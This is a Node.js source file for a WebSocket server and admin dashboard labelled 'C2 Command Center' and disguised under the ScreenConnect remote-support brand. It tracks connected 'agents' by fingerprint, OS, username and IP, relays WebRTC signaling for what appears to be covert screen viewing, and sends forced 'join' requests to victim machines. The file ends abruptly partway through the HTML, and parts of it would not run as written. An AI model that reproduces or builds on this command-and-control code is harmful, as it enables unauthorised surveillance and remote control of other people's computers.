const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const { createClient } = require('@libsql/client');
const fs = require('fs');
const os = require('os');
 
// =====================================================
// TURSO DATABASE SETUP - VERCEL OPTIMIZED
// UPDATED SCHEMA WITH FINGERPRINT
// =====================================================

const RAW_URL = process.env.TURSO_DATABASE_URL || '';
const RAW_TOKEN = process.env.TURSO_AUTH_TOKEN || '';

const TURSO_DB_URL = RAW_URL.trim();
const TURSO_AUTH_TOKEN = RAW_TOKEN
 .replace(/^Bearer\s*/i, '')
 .trim();

let dbClient = null;
let dbReady = false;
let dbError = null;

// Prevent simultaneous initialization attempts
let dbInitPromise = null;

// Preserve existing in-memory variable
const memoryUsers = {};

// Connection initialization retries
const DB_MAX_RETRIES = 4;

const DB_RETRY_DELAYS = [
 1000,
 2000,
 4000
];

// =====================================================
// DATABASE ERROR LOGGING
// =====================================================

function logDBError(context, error) {
 console.error(`[DB] ${context}:`, {
 message: error?.message,
 name: error?.name,
 code: error?.code || error?.cause?.code,
 cause: error?.cause?.message || error?.cause,
 stack: error?.stack
 });
}

// =====================================================
// IDENTIFY CONNECTION ERRORS
// =====================================================

function isConnectionError(error) {
 const message = [
 error?.message,
 error?.cause?.message,
 error?.cause?.code,
 error?.code
 ]
 .filter(Boolean)
 .join(' ')
 .toLowerCase();

 return [
 'fetch failed',
 'econnreset',
 'econnrefused',
 'econnaborted',
 'etimedout',
 'timeout',
 'timed out',
 'enotfound',
 'eai_again',
 'socket',
 'network',
 'connection reset',
 'connection refused',
 'und_err'
 ].some(term => message.includes(term));
}

// =====================================================
// DATABASE SCHEMA
// UPDATED: INCLUDES FINGERPRINT COLUMN
// =====================================================

async function ensureSchema(client) {
 if (!client) {
 throw new Error('Cannot create schema: Turso client unavailable.');
 }

 // USERS TABLE - UPDATED WITH FINGERPRINT
 await client.execute(`
 CREATE TABLE IF NOT EXISTS users (
 id TEXT PRIMARY KEY,
 fingerprint TEXT,
 os TEXT,
 arch TEXT,
 user TEXT,
 ip TEXT,
 last_seen INTEGER,
 status TEXT DEFAULT 'Offline',
 created_at INTEGER DEFAULT (strftime('%s', 'now')),
 serial_number TEXT
 );
 `);

 // CRITICAL FIX: Ensure columns exist even if table was created earlier without them
 try {
 await client.execute(`
 ALTER TABLE users ADD COLUMN IF NOT EXISTS fingerprint TEXT;
 `);
 } catch (e) {
 // Column might already exist or be immutable in some configs, ignore error
 }

 try {
 await client.execute(`
 ALTER TABLE users ADD COLUMN IF NOT EXISTS serial_number TEXT;
 `);
 } catch (e) {
 // Column might already exist or be immutable in some configs, ignore error
 }

 // LOGS TABLE - EXISTING STRUCTURE PRESERVED
 await client.execute(`
 CREATE TABLE IF NOT EXISTS logs (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 message TEXT,
 timestamp INTEGER DEFAULT (strftime('%s', 'now'))
 );
 `);

 // USER LOGS TABLE - EXISTING STRUCTURE PRESERVED
 await client.execute(`
 CREATE TABLE IF NOT EXISTS user_logs (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 user_id TEXT,
 event_type TEXT,
 details TEXT,
 timestamp INTEGER DEFAULT (strftime('%s', 'now'))
 );
 `);

 // Verify database responds
 await client.execute('SELECT 1 AS schema_check');

 console.log('[DB] Existing database schema verified with fingerprint/serial columns.');

 return true;
}

// =====================================================
// CREATE AND TEST TURSO CONNECTION
// =====================================================

async function connectTurso() {
 if (!TURSO_DB_URL || !TURSO_AUTH_TOKEN) {
 throw new Error('Missing TURSO_DATABASE_URL or TURSO_AUTH_TOKEN.');
 }

 console.log('[DB] Creating Turso client...');

 const client = createClient({
 url: TURSO_DB_URL,
 authToken: TURSO_AUTH_TOKEN
 });

 // Test actual connection
 await client.execute('SELECT 1 AS health');

 console.log('[DB] Turso connection test successful.');

 // Verify existing tables without modifying their structure
 await ensureSchema(client);

 // Only mark client ready after all checks succeed
 dbClient = client;
 dbReady = true;
 dbError = null;

 console.log('[DB] Database connection ready.');

 return client;
}

// =====================================================
// INITIALIZE DATABASE
// LAZY INITIALIZATION FOR VERCEL
// =====================================================

async function initDB() {
 // Reuse an already initialized client
 if (dbReady && dbClient) {
 return dbClient;
 }

 // Reuse an initialization already in progress
 if (dbInitPromise) {
 return dbInitPromise;
 }

 dbInitPromise = (async () => {
 console.log('[DB] Starting database initialization...');
 console.log('[DB] Database URL configured:', Boolean(TURSO_DB_URL));
 console.log('[DB] Authentication token loaded:', Boolean(TURSO_AUTH_TOKEN));

 for (
 let attempt = 1;
 attempt <= DB_MAX_RETRIES;
 attempt++
 ) {
 try {
 console.log(`[DB] Connection attempt ${attempt}/${DB_MAX_RETRIES}`);

 const client = await connectTurso();

 console.log('[DB] Database initialization successful.');

 return client;
 } catch (error) {
 dbReady = false;
 dbClient = null;

 dbError = error?.message || 'Unknown database error';

 logDBError(`Connection attempt ${attempt} failed`, error);

 if (attempt < DB_MAX_RETRIES) {
 const delay = DB_RETRY_DELAYS[attempt - 1] || 8000;

 console.log(`[DB] Retrying in ${delay / 1000} seconds...`);

 await new Promise(resolve => {
 setTimeout(resolve, delay);
 });
 } else {
 console.error('[DB] All connection attempts exhausted.');
 }
 }
 }

 return null;
 })();

 try {
 return await dbInitPromise;
 } finally {
 // Permit a later request to try again after failure
 if (!dbReady) {
 dbInitPromise = null;
 }
 }
}

// =====================================================
// GET DATABASE CLIENT
// ALL DATABASE ACCESS SHOULD USE THIS FUNCTION
// =====================================================

async function getDB() {
 if (dbReady && dbClient) {
 return dbClient;
 }

 const client = await initDB();

 if (!client || !dbReady) {
 throw new Error(`Turso unavailable: ${dbError || 'Connection failed'}`);
 }

 return client;
}

// =====================================================
// EXECUTE DATABASE QUERY
// =====================================================

async function executeDB(sql, params = []) {
 const client = await getDB();

 try {
 const result = await client.execute({
 sql,
 args: params
 });

 return result;
 } catch (error) {
 logDBError('Database query failed', error);

 // Mark a broken connection unavailable.
 // The next request/query can initialize a fresh client.
 if (isConnectionError(error)) {
 dbReady = false;
 dbClient = null;

 dbError = error?.message || 'Connection lost';

 console.warn('[DB] Connection lost. A fresh connection will be initialized on the next database request.');
 }

 // Do not automatically repeat a failed INSERT/UPDATE:
 // the database may have executed it before the network failed.
 throw error;
 }
}

// =====================================================
// DATABASE QUERY HELPERS
// EXISTING FUNCTION NAMES PRESERVED
// =====================================================

// General query
async function query(sql, params = []) {
 return executeDB(sql, params);
}

// Return one row
async function queryOne(sql, params = []) {
 const result = await executeDB(sql, params);
 return result.rows[0] ?? null;
}

// Return multiple rows
async function queryRows(sql, params = []) {
 const result = await executeDB(sql, params);
 return result.rows;
}

// =====================================================
// DATABASE STATUS
// =====================================================

function getDBStatus() {
 return {
 ready: dbReady,
 connected: Boolean(dbClient && dbReady),
 error: dbError
 };
}

// =====================================================
// DATABASE LOGGING
// =====================================================

function logDB(msg) {
 const timestamp = Date.now();

 console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);

 // Keep application logging non-blocking
 if (dbReady && dbClient) {
 executeDB(
 'INSERT INTO logs (message, timestamp) VALUES (?, ?)',
 [
 String(msg),
 Math.floor(timestamp / 1000)
 ]
 ).catch(error => {
 console.error('[DB LOG ERROR]', error.message);
 });
 }
}

// =====================================================
// USER EVENT LOGGING
// =====================================================

async function logUserEvent(userId, eventType, details = '') {
 if (!dbReady || !dbClient) {
 console.warn('[DB] Skipping user event log: database unavailable.');
 return;
 }

 try {
 await executeDB(
 `INSERT INTO user_logs
 (user_id, event_type, details, timestamp)
 VALUES (?, ?, ?, ?)`,
 [
 userId,
 eventType,
 details,
 Math.floor(Date.now() / 1000)
 ]
 );
 } catch (error) {
 console.error('[DB USER LOG ERROR]', error.message);
 }
}

// =====================================================
// INITIALIZATION MESSAGE
// =====================================================

console.log('[DB] Database module loaded. Connection will initialize on first query.');

// =====================================================
// WEBSOCKET SERVER
// =====================================================

const wss = new WebSocket.Server({ noServer: true });

// =====================================================
// WEBSOCKET HELPERS
// =====================================================

function sendMessage(ws, data) {
 if (ws && ws.readyState === WebSocket.OPEN) {
 ws.send(JSON.stringify(data));
 return true;
 }
 return false;
}

function notifyAdmin(adminId, message) {
 for (const client of wss.clients) {
 if (client.isAdmin && client.adminId === adminId && client.readyState === WebSocket.OPEN) {
 sendMessage(client, { type: 'notification', message });
 }
 }
}

function broadcastToAdmins(sender, msg) {
 for (const client of wss.clients) {
 if (client.isAdmin && client.readyState === WebSocket.OPEN) {
 sendMessage(client, msg);
 }
 }
}

function findAgentByUniqueID(uniqueId) {
 for (const client of wss.clients) {
 if (!client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
 return client;
 }
 }
 return null;
}

function isAgentConnected(uniqueId, excludedClient = null) {
 for (const client of wss.clients) {
 if (client !== excludedClient && !client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
 return true;
 }
 }
 return false;
}

// =====================================================
// WEBSOCKET CONNECTION HANDLING
// =====================================================

wss.on('connection', (ws, req) => {
 const clientId = uuidv4().substring(0, 8);
 ws.id = clientId;
 ws.isAdmin = false;
 ws.adminId = null;
 ws.uniqueId = null;
 ws.isAlive = true;
 const remoteAddress = req.socket.remoteAddress || 'Unknown';

 logDB(`[+] WebSocket Connected: ${clientId}`);

 ws.on('message', async (msgRaw) => {
 try {
 const data = JSON.parse(msgRaw.toString());
 if (!data || typeof data !== 'object') return;

 // ADMIN REGISTRATION
 if (data.type === 'register_admin') {
 ws.isAdmin = true;
 ws.adminId = clientId;
 logDB(`[ADMIN] Connected via port ${req.socket.remotePort}`);
 notifyAdmin(clientId, '🛡️ Admin Session Started');
 
 // CRITICAL: Fetch ALL users from DB immediately
 let allUsers = await queryRows('SELECT * FROM users ORDER BY last_seen DESC');
 
 // If DB is down, use memory fallback
 if (!dbReady || allUsers.length === 0) {
 // Convert memory users to DB format
 allUsers = Object.values(memoryUsers).map(u => ({
 id: u.id,
 os: u.os,
 arch: u.arch,
 user: u.user,
 ip: u.ip,
 last_seen: u.last_seen,
 status: u.status,
 serial_number: u.serial_number,
 fingerprint: u.fingerprint
 }));
 }

 const usersList = allUsers.map(u => ({
 id: u.id,
 os: u.os,
 arch: u.arch,
 user: u.user,
 ip: u.ip,
 last_seen: u.last_seen,
 status: u.status,
 serial_number: u.serial_number,
 fingerprint: u.fingerprint
 }));
 
 // Send the full list to the admin
 sendMessage(ws, { type: 'init_users', users: usersList });
 return;
 }

 // AGENT INFO — THE CRITICAL FIX
 if (data.type === 'info') {
 if (ws.isAdmin) return;

 const uniqueId = String(data.uniqueId || data.id || '').trim();
 if (!uniqueId || uniqueId.length > 255) {
 logDB('[WARN] Invalid agent unique ID');
 return;
 }

 ws.uniqueId = uniqueId;
 const now = Date.now();

 // Update memory fallback immediately
 memoryUsers[uniqueId] = {
 id: uniqueId,
 os: data.os || null,
 arch: data.arch || null,
 user: data.user || null,
 ip: data.ip || remoteAddress,
 last_seen: now,
 status: 'Online',
 serial_number: data.serialNumber || uniqueId,
 fingerprint: data.fingerprint || uniqueId
 };

 if (dbClient && dbReady) {
 const existingUser = await queryOne('SELECT * FROM users WHERE id = ?', [uniqueId]);

 const client = await getDB();

 if (!existingUser) {
 await client.execute({
 sql: `
 INSERT INTO users (
 id, fingerprint, os, arch, user, ip, last_seen, status, serial_number
 )
 VALUES (?, ?, ?, ?, ?, ?, ?, 'Online', ?)
 `,
 args: [
 uniqueId,
 data.fingerprint || uniqueId,
 data.os || null,
 data.arch || null,
 data.user || null,
 data.ip || remoteAddress,
 now,
 data.serialNumber || uniqueId
 ]
 });

 logDB(`[AGENT] NEW: ${uniqueId} (${data.os || 'unknown'})`);

 await logUserEvent(
 uniqueId,
 'INIT',
 `New connection from ${data.ip || remoteAddress}`
 );
 } else {
 await client.execute({
 sql: `
 UPDATE users SET
 last_seen = ?,
 status = 'Online',
 os = COALESCE(?, os),
 arch = COALESCE(?, arch),
 user = COALESCE(?, user),
 ip = COALESCE(?, ip),
 serial_number = COALESCE(?, serial_number),
 fingerprint = COALESCE(?, fingerprint)
 WHERE id = ?
 `,
 args: [
 now,
 data.os || null,
 data.arch || null,
 data.user || null,
 data.ip || remoteAddress,
 data.serialNumber || uniqueId,
 data.fingerprint || uniqueId,
 uniqueId
 ]
 });

 logDB(`[AGENT] REJOIN: ${uniqueId} (${data.os || 'unknown'})`);

 await logUserEvent(
 uniqueId,
 'REJOIN',
 `Reconnected from ${data.ip || remoteAddress}`
 );
 }
 // Notify all admins about this user update
 for (const client of wss.clients) {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 sendMessage(client, {
 type: 'user_update',
 id: uniqueId,
 info: data,
 lastSeen: now,
 });
 }
 }
 }
 return;
 }

 // HEARTBEAT
 if (data.type === 'heartbeat') {
 if (!ws.isAdmin && ws.uniqueId) {
 const now = Date.now();

 // Update memory fallback
 if (memoryUsers[ws.uniqueId]) {
 memoryUsers[ws.uniqueId].last_seen = now;
 memoryUsers[ws.uniqueId].status = 'Online';
 }

 // Update Turso database
 try {
 const client = await getDB();

 await client.execute({
 sql: `
 UPDATE users
 SET last_seen = ?
 WHERE id = ?
 `,
 args: [now, ws.uniqueId]
 });

 await logUserEvent(
 ws.uniqueId,
 'HEARTBEAT',
 `Last seen: ${new Date(now).toISOString()}`
 );

 } catch (error) {
 console.error(
 `[HEARTBEAT] Database update failed for ${ws.uniqueId}:`,
 error.message
 );
 }

 // Notify admins of heartbeat to keep UI fresh without full refresh
 for (const client of wss.clients) {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 sendMessage(client, {
 type: 'heartbeat',
 id: ws.uniqueId,
 lastSeen: now
 });
 }
 }
 }
 return;
 }

 // WEBRTC SIGNALING
 if (['offer', 'answer', 'candidate'].includes(data.type)) {
 if (ws.isAdmin && data.targetId) {
 const targetWs = findAgentByUniqueID(String(data.targetId));

 if (targetWs && targetWs.readyState === WebSocket.OPEN) {
 sendMessage(targetWs, data);
 } else {
 logDB(`[WARN] Agent not connected: ${data.targetId}`);
 }
 return;
 }

 if (!ws.isAdmin && data.targetId === 'admin') {
 for (const client of wss.clients) {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 sendMessage(client, data);
 }
 }
 return;
 }
 }

 // FORCE INSTALLATION / JOIN REQUEST
 if (data.type === 'request_join') {
 if (ws.isAdmin) {
 const targetWs = findAgentByUniqueID(String(data.targetId));

 if (targetWs && targetWs.readyState === WebSocket.OPEN) {
 sendMessage(targetWs, {
 type: 'request_join',
 targetId: data.targetId,
 from: 'admin'
 });

 logDB(`[ADMIN] Requested join to ${data.targetId}`);

 await logUserEvent(
 data.targetId,
 'ADMIN_JOIN',
 `Admin ${ws.id} requested join`
 );

 } else {
 logDB(`[WARN] Agent ${data.targetId} not connected for join`);
 }
 }
 return;
 }

 } catch (error) {
 logDB(`[ERR] Message processing error: ${error.message}`);
 }
 });

 ws.on('pong', () => {
 ws.isAlive = true;
 });

 ws.on('close', async () => {
 logDB(`[-] Client Disconnected: ${ws.id}`);

 if (!ws.isAdmin && ws.uniqueId) {
 const uniqueId = ws.uniqueId;

 if (!isAgentConnected(uniqueId, ws)) {

 // Update memory fallback
 if (memoryUsers[uniqueId]) {
 memoryUsers[uniqueId].status = 'Offline';
 memoryUsers[uniqueId].last_seen = Date.now();
 }

 // Update Turso database
 try {
 const client = await getDB();

 await client.execute({
 sql: `
 UPDATE users
 SET status = 'Offline', last_seen = ?
 WHERE id = ?
 `,
 args: [Date.now(), uniqueId]
 });

 logDB(`[AGENT] Offline: ${uniqueId}`);

 await logUserEvent(
 uniqueId,
 'OFFLINE',
 `Disconnected at ${new Date().toISOString()}`
 );

 } catch (error) {
 logDB(`[DB ERR] Disconnect update: ${error.message}`);
 }
 }
 }

 broadcastToAdmins(ws, { type: 'refresh_users' });
 });

 ws.on('error', (error) => {
 logDB(`[WS ERR] ${ws.id}: ${error.message}`);
 });
});

// =====================================================
// WEBSOCKET HEARTBEAT
// =====================================================

const heartbeat = setInterval(() => {
 for (const ws of wss.clients) {
 if (ws.isAlive === false) { ws.terminate(); continue; }
 ws.isAlive = false;
 if (ws.readyState === WebSocket.OPEN) { ws.ping(); }
 }
}, 30000);

wss.on('close', () => { clearInterval(heartbeat); });

// =====================================================
// SERVER STARTUP — VERCEL SERVERLESS FUNCTION
// =====================================================

module.exports = async (req, res) => {
 // Handle WebSocket Upgrade
 const upgradeHeader = req.headers['upgrade'] || '';
 if (upgradeHeader.toLowerCase() === 'websocket') {
 const url = new URL(req.url, `http://${req.headers.host}`);
 
 const dummyRes = {
 writeHead: (status, headers) => {
 res.writeHead(status, headers);
 },
 end: () => {
 // Do nothing, the WebSocket server will handle the rest
 }
 };

 wss.handleUpgrade(req, req.socket, Buffer.from(''), (socket) => {
 wss.emit('connection', socket, req);
 });

 return;
 }


 // Handle HTTP Requests (Health Check, Admin Panel)
 if (req.method === 'GET' && req.url === '/health') {
 try {
 // Initialize or retrieve the database client
 const client = await getDB();

 // Verify actual database connectivity
 await client.execute('SELECT 1 AS health_check');

 res.json({
 status: 'ok',
 service: 'screen-connect',
 database: 'connected',
 uptime: process.uptime(),
 db_type: 'turso/libsql',
 db_ready: true,
 error: null,
 });

 } catch (error) {

 console.error('[HEALTH] Database check failed:', error);

 res.status(503).json({
 status: 'degraded',
 service: 'screen-connect',
 database: 'disconnected',
 uptime: process.uptime(),
 db_type: 'libsql',
 error: error.message,
 db_ready: false,
 });
 }

 return;
 }


 if (req.method === 'GET' && req.url === '/') {
 res.send(adminHTML);
 return;
 }

 if (req.method === 'GET' && req.url === '/admin.html') {
 res.setHeader('Content-Type', 'text/html');
 res.send(adminHTML);
 return;
 }

 // Default response
 res.statusCode = 404;
 res.end('Not Found');
};

// =====================================================
// ADMIN PANEL HTML
// UPDATED: ADDED FINGERPRINT COLUMN TO TABLE
// ESCAPED PROPERLY TO AVOID SYNTAX ERRORS
// =====================================================

const adminHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>C2 Command Center</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

 <style>
 :root {
 --bg-base: #080b12;
 --bg-surface: #0f1523;
 --bg-surface-hover: #182033;
 --bg-glass: rgba(15, 21, 35, 0.7);
 --text-main: #e2e8f0;
 --text-muted: #64748b;
 --accent: #0ea5e9;
 --accent-glow: rgba(14, 165, 233, 0.4);
 --success: #10b981;
 --success-glow: rgba(16, 185, 129, 0.3);
 --border: #1e293b;
 --border-light: rgba(255, 255, 255, 0.05);
 }

 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

 body {
 background-color: var(--bg-base);
 color: var(--text-main);
 display: flex;
 height: 100vh;
 overflow: hidden;
 background-image:
 radial-gradient(circle at 15% 50%, rgba(14, 165, 233, 0.05), transparent 25%),
 radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.03), transparent 25%);
 }

 .sidebar {
 width: 260px;
 background-color: var(--bg-glass);
 backdrop-filter: blur(12px);
 border-right: 1px solid var(--border-light);
 display: flex;
 flex-direction: column;
 padding: 24px 0;
 z-index: 10;
 }

 .logo-area {
 padding: 0 24px 32px 24px;
 font-size: 1.25rem;
 font-weight: 700;
 letter-spacing: -0.5px;
 display: flex;
 align-items: center;
 gap: 12px;
 color: #fff;
 }

 .logo-area i {
 color: var(--accent);
 font-size: 1.4rem;
 filter: drop-shadow(0 0 8px var(--accent-glow));
 }

 .nav-menu {
 flex: 1;
 overflow-y: auto;
 display: flex;
 flex-direction: column;
 gap: 4px;
 padding: 0 12px;
 }

 .nav-item {
 padding: 12px 16px;
 display: flex;
 align-items: center;
 gap: 14px;
 color: var(--text-muted);
 cursor: pointer;
 transition: all 0.2s ease;
 text-decoration: none;
 font-size: 0.9rem;
 font-weight: 500;
 border-radius: 8px;
 position: relative;
 }

 .nav-item:hover {
 background-color: var(--bg-surface-hover);
 color: var(--text-main);
 }

 .nav-item.active {
 background: linear-gradient(90deg, rgba(14, 165, 233, 0.15) 0%, transparent 100%);
 color: var(--accent);
 border-left: 3px solid var(--accent);
 border-radius: 4px 8px 8px 4px;
 }

 .nav-item i {
 width: 20px;
 text-align: center;
 font-size: 1.1rem;
 }

 .build-btn-container {
 padding: 24px;
 border-top: 1px solid var(--border-light);
 }

 .build-btn {
 width: 100%;
 padding: 12px;
 background: linear-gradient(135deg, var(--accent), #0284c7);
 color: #fff;
 border: none;
 border-radius: 8px;
 font-weight: 600;
 font-size: 0.9rem;
 cursor: pointer;
 transition: all 0.3s ease;
 display: flex;
 justify-content: center;
 align-items: center;
 gap: 8px;
 box-shadow: 0 4px 12px var(--accent-glow);
 }

 .build-btn:hover {
 transform: translateY(-1px);
 box-shadow: 0 6px 16px var(--accent-glow);
 }

 .main-content {
 flex: 1;
 display: flex;
 flex-direction: column;
 overflow: hidden;
 position: relative;
 }

 .top-header {
 height: 72px;
 display: flex;
 align-items: center;
 justify-content: space-between;
 padding: 0 32px;
 border-bottom: 1px solid var(--border-light);
 background-color: var(--bg-glass);
 backdrop-filter: blur(12px);
 z-index: 5;
 }

 .search-bar {
 display: flex;
 align-items: center;
 background-color: var(--bg-surface);
 border: 1px solid var(--border-light);
 border-radius: 8px;
 padding: 10px 16px;
 width: 380px;
 transition: all 0.3s ease;
 }

 .search-bar:focus-within {
 border-color: var(--accent);
 box-shadow: 0 0 0 3px var(--accent-glow);
 }

 .search-bar i {
 color: var(--text-muted);
 margin-right: 12px;
 }

 .search-bar input {
 background: transparent;
 border: none;
 color: var(--text-main);
 width: 100%;
 outline: none;
 font-size: 0.9rem;
 }

 .header-actions {
 display: flex;
 gap: 24px;
 color: var(--text-muted);
 font-size: 1.1rem;
 }

 .header-actions i {
 cursor: pointer;
 transition: color 0.2s;
 }

 .header-actions i:hover {
 color: var(--text-main);
 }

 .content-body {
 padding: 32px;
 overflow-y: auto;
 flex: 1;
 }

 .page-title {
 font-size: 1.6rem;
 font-weight: 600;
 margin-bottom: 24px;
 letter-spacing: -0.5px;
 }

 .stats-grid {
 display: grid;
 grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
 gap: 20px;
 margin-bottom: 32px;
 }

 .stat-card {
 background-color: var(--bg-surface);
 border: 1px solid var(--border-light);
 border-radius: 12px;
 padding: 24px;
 display: flex;
 flex-direction: column;
 gap: 12px;
 position: relative;
 overflow: hidden;
 transition: transform 0.2s;
 }

 .stat-card:hover {
 transform: translateY(-2px);
 border-color: rgba(255,255,255,0.1);
 }

 .stat-card::before {
 content: '';
 position: absolute;
 top: 0; left: 0; width: 100%; height: 2px;
 background: linear-gradient(90deg, transparent, var(--border-light), transparent);
 }

 .stat-card .title {
 color: var(--text-muted);
 font-size: 0.8rem;
 text-transform: uppercase;
 letter-spacing: 1px;
 font-weight: 600;
 }

 .stat-card .value {
 font-size: 2.2rem;
 font-weight: 700;
 }

 .stat-card .value.online { color: var(--success); text-shadow: 0 0 12px var(--success-glow); }
 .stat-card .value.accent { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }

 .data-panel {
 background-color: var(--bg-surface);
 border: 1px solid var(--border-light);
 border-radius: 12px;
 overflow: hidden;
 }

 .panel-header {
 padding: 20px 24px;
 border-bottom: 1px solid var(--border-light);
 font-weight: 600;
 display: flex;
 justify-content: space-between;
 align-items: center;
 background: rgba(255,255,255,0.01);
 }

 .table-header {
 display: grid;
 grid-template-columns: 60px 2fr 1.5fr 1fr 1fr 1fr 1fr;
 padding: 16px 24px;
 background-color: rgba(0, 0, 0, 0.2);
 color: var(--text-muted);
 font-size: 0.75rem;
 text-transform: uppercase;
 letter-spacing: 1px;
 font-weight: 600;
 border-bottom: 1px solid var(--border-light);
 }

 .table-row {
 display: grid;
 grid-template-columns: 60px 2fr 1.5fr 1fr 1fr 1fr 1fr;
 padding: 18px 24px;
 border-bottom: 1px solid var(--border-light);
 align-items: center;
 transition: all 0.2s ease;
 cursor: pointer;
 }

 .table-row:hover {
 background-color: var(--bg-surface-hover);
 transform: scale(1.002);
 }

 .table-row:last-child {
 border-bottom: none;
 }

 .custom-checkbox {
 width: 20px;
 height: 20px;
 border: 2px solid var(--text-muted);
 border-radius: 6px;
 display: flex;
 justify-content: center;
 align-items: center;
 transition: all 0.2s;
 }

 .table-row:hover .custom-checkbox {
 border-color: var(--accent);
 }

 .machine-info {
 display: flex;
 flex-direction: column;
 gap: 6px;
 }

 .machine-info .name {
 font-weight: 500;
 display: flex;
 align-items: center;
 gap: 10px;
 color: #fff;
 }

 .machine-info .name i {
 color: var(--accent);
 font-size: 1.1rem;
 }

 .machine-info .company {
 font-size: 0.8rem;
 color: var(--text-muted);
 }

 .status {
 display: flex;
 align-items: center;
 gap: 10px;
 font-size: 0.9rem;
 font-weight: 500;
 }

 .status-dot {
 width: 8px;
 height: 8px;
 border-radius: 50%;
 }

 .status-dot.online {
 background-color: var(--success);
 box-shadow: 0 0 10px var(--success);
 }

 .status-dot.offline {
 background-color: var(--text-muted);
 }

 .modal-overlay {
 position: fixed;
 top: 0; left: 0; width: 100vw; height: 100vh;
 background: rgba(0, 0, 0, 0.8);
 backdrop-filter: blur(8px);
 display: flex;
 justify-content: center;
 align-items: center;
 z-index: 1000;
 opacity: 0;
 pointer-events: none;
 transition: opacity 0.3s ease;
 }

 .modal-overlay.active {
 opacity: 1;
 pointer-events: all;
 }

 .session-container {
 width: 85vw;
 height: 85vh;
 background: #000;
 border: 1px solid var(--border);
 border-radius: 12px;
 display: flex;
 flex-direction: column;
 overflow: hidden;
 box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--border-light);
 transform: scale(0.95);
 transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
 }

 .modal-overlay.active .session-container {
 transform: scale(1);
 }

 .session-toolbar {
 height: 50px;
 background: #0f1523;
 border-bottom: 1px solid var(--border-light);
 display: flex;
 align-items: center;
 justify-content: space-between;
 padding: 0 20px;
 }

 .session-title {
 font-size: 0.9rem;
 font-weight: 500;
 display: flex;
 align-items: center;
 gap: 10px;
 }

 .session-title .dot {
 width: 8px; height: 8px;
 background: var(--success);
 border-radius: 50%;
 box-shadow: 0 0 8px var(--success);
 animation: pulse 2s infinite;
 }

 @keyframes pulse {
 0% { box-shadow: 0 0 0 0 var(--success-glow); }
 70% { box-shadow: 0 0 0 6px transparent; }
 100% { box-shadow: 0 0 0 0 transparent; }
 }

 .session-actions {
 display: flex;
 gap: 12px;
 }

 .tool-btn {
 background: rgba(255,255,255,0.05);
 border: 1px solid var(--border-light);
 color: var(--text-main);
 width: 32px; height: 32px;
 border-radius: 6px;
 display: flex;
 justify-content: center;
 align-items: center;
 cursor: pointer;
 transition: all 0.2s;
 }

 .tool-btn:hover {
 background: rgba(255,255,255,0.1);
 }

 .tool-btn.end-session {
 color: #ef4444;
 background: rgba(239, 68, 68, 0.1);
 border-color: rgba(239, 68, 68, 0.2);
 width: auto;
 padding: 0 12px;
 font-size: 0.8rem;
 font-weight: 600;
 gap: 6px;
 }

 .tool-btn.end-session:hover {
 background: rgba(239, 68, 68, 0.2);
 }

 .video-screen {
 flex: 1;
 background: #020617;
 display: flex;
 justify-content: center;
 align-items: center;
 position: relative;
 overflow: hidden;
 background-image:
 radial-gradient(circle at center, #1e293b 0%, #020617 100%);
 }

 .connecting-state {
 text-align: center;
 color: var(--text-main);
 }

 .connecting-state i {
 font-size: 3rem;
 color: var(--accent);
 margin-bottom: 20px;
 animation: spin 2s linear infinite;
 }

 @keyframes spin {
 100% { transform: rotate(360deg); }
 }

 .connecting-state h2 {
 font-weight: 500;
 margin-bottom: 8px;
 }

 .connecting-state p {
 color: var(--text-muted);
 font-size: 0.9rem;
 }

 ::-webkit-scrollbar { width: 8px; }
 ::-webkit-scrollbar-track { background: var(--bg-base); }
 ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
 ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
 </style>
</head>
<body>

 <!-- Sidebar -->
 <aside class="sidebar">
 <div class="logo-area">
 <i class="fa-solid fa-layer-group"></i> ScreenConnect
 </div>
 <div class="nav-menu">
 <a href="#" class="nav-item active"><i class="fa-solid fa-desktop"></i> Machines</a>
 <a href="#" class="nav-item"><i class="fa-solid fa-users"></i> Users</a>
 <a href="#" class="nav-item"><i class="fa-solid fa-network-wired"></i> Networks</a>
 <a href="#" class="nav-item"><i class="fa-solid fa-chart-pie"></i> Analytics</a>
 <a href="#" class="nav-item"><i class="fa-solid fa-gear"></i> Settings</a>
 </div>
 <div class="build-btn-container">
 <button class="build-btn" onclick="openNewSession()">
 <i class="fa-solid fa-plus"></i> New Session
 </button>
 </div>
 </aside>

 <!-- Main Content -->
 <main class="main-content">

 <!-- Header -->
 <header class="top-header">
 <div class="search-bar">
 <i class="fa-solid fa-magnifying-glass"></i>
 <input type="text" placeholder="Search connected machines..." id="searchInput" onkeyup="filterTable()">
 </div>
 <div class="header-actions">
 <i class="fa-regular fa-bell"></i>
 <i class="fa-regular fa-circle-question"></i>
 <div style="width: 32px; height: 32px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.8rem; cursor: pointer;">
 JD
 </div>
 </div>
 </header>

 <!-- Dashboard Body -->
 <div class="content-body">
 <h1 class="page-title">Guest Connected</h1>

 <!-- Stats Row -->
 <div class="stats-grid">
 <div class="stat-card">
 <span class="title">Total Users</span>
 <span class="value" id="totalUsers">0</span>
 </div>
 <div class="stat-card">
